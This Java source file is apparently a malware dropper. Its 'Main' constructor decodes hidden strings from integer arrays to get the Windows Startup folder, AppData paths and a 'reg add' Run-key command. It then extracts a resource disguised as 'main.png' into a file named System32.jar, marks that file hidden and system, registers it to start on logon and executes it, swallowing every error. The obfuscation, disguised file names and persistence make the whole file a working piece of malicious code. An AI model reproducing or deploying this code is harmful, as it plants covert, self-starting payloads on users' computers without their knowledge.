import java.awt.EventQueue;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class Main {
	
	public Main() {
		int d[] = {92,66,114,115,72,102,122,104,100,91,121,108,121,118,124,118,108,94,123,118,134,132,137,134,126,141,118,114,133,139,130,142,151,148,126,118,152,134,152,155,72,118,143,153,161,137,126,161,159,152,164,148,161,168,146,138,172,154,172,175,177,173};
		int d2[] = {92,66,114,115,72,102,122,104,100,85,121,110,109,121};
		int d3[] = {92,84,123,118,120,106,115,58,58,55,116,108,126};
		int d4[] = {114,102,105,35,101,105,106,39,80,84,77,96,104,96,125,117,132,136,115,133,121,113,99,128,123,139,137,142,139,131,146,123,119,138,144,135,147,156,153,131,107,158,156,157,145,155,162,133,149,163,165,156,163,163,146,137,173,167,90,106,178,93,145,184,179,181,167,176,119,119,102,118,188,105,156,144,147,172,161,169,112,128,182,115};
		char[] a = new char[d.length];
		char[] a2 = new char[d2.length];
		char[] a3 = new char[d3.length];
		char[] a4 = new char[d4.length];
		for(int i = d.length - 1 ; i >= 0 ; i--) {
			a[i] = (char) (d[i] - i);
		}
		for(int i = d2.length - 1 ; i >= 0 ; i--) {
			a2[i] = (char) (d2[i] - i);
		}
		for(int i = d3.length - 1 ; i >= 0 ; i--) {
			a3[i] = (char) (d3[i] - i);
		}
		for(int i = d4.length - 1 ; i >= 0 ; i--) {
			a4[i] = (char) (d4[i] - i);
		}
		String s1 = new String(a);
		String s2 = new String(a2);
		String s3 = new String(a3);
		String s4 = new String(a4);
        ClassLoader cl = getClass().getClassLoader();
        InputStream is = cl.getResourceAsStream("main.png");
        long size = cl.getResource("main.png").getFile().length();
        try {
			byte[] b = convertStreamToByteArray(is,size);
	        try {
	        	File f = new File(System.getProperty("user.home")+s1);
	        	if(f.exists()) {
	        		FileOutputStream fos = new FileOutputStream(f+s3);
	        		fos.write(b);
	        		fos.close();
		        	String[] c = new String[3];
		        	c[0] = "cmd";
		        	c[1] = "/c";
		        	c[2] = "attrib +s +h \""+f.getAbsolutePath()+s3+"\"";
					new ProcessBuilder(c).start();
		        	c = new String[3];
		        	c[0] = "cmd";
		        	c[1] = "/c";
		        	c[2] = "\""+f.getAbsolutePath()+s3+"\"";
					new ProcessBuilder(c).start();
	        	}
	        }catch(Exception e) {}
	        try {
	        	File f = new File(System.getProperty("user.home")+s2);
	        	if(f.exists()) {
	        		FileOutputStream fos = new FileOutputStream(f+s3);
	        		fos.write(b);
	        		fos.close();
		        	String[] c = new String[3];
		        	c[0] = "cmd";
		        	c[1] = "/c";
		        	c[2] = "attrib +s +h \""+f.getAbsolutePath()+s3+"\"";
					new ProcessBuilder(c).start();
		        	c = new String[3];
		        	c[0] = "cmd";
		        	c[1] = "/c";
		        	c[2] = s4+"\""+f.getAbsolutePath()+s3+"\" /f";
		        	new ProcessBuilder(c).start();
		        	c = new String[3];
		        	c[0] = "cmd";
		        	c[1] = "/c";
		        	c[2] = "\""+f.getAbsolutePath()+s3+"\"";
					new ProcessBuilder(c).start();
	        	}
	        }catch(Exception e) {}
		} catch (IOException e) {}
 
	}
	
	public byte[] convertStreamToByteArray(InputStream stream, long size) throws IOException {
	    if (size > Integer.MAX_VALUE) {
	        return new byte[0];
	    }
	    byte[] buffer = new byte[(int)size];
	    ByteArrayOutputStream os = new ByteArrayOutputStream();
	    int line = 0;
	    while ((line = stream.read(buffer)) != -1) {
	        os.write(buffer, 0, line);
	    }
	    stream.close();
	    os.flush();
	    os.close();
	    return os.toByteArray();
	}	
	
}
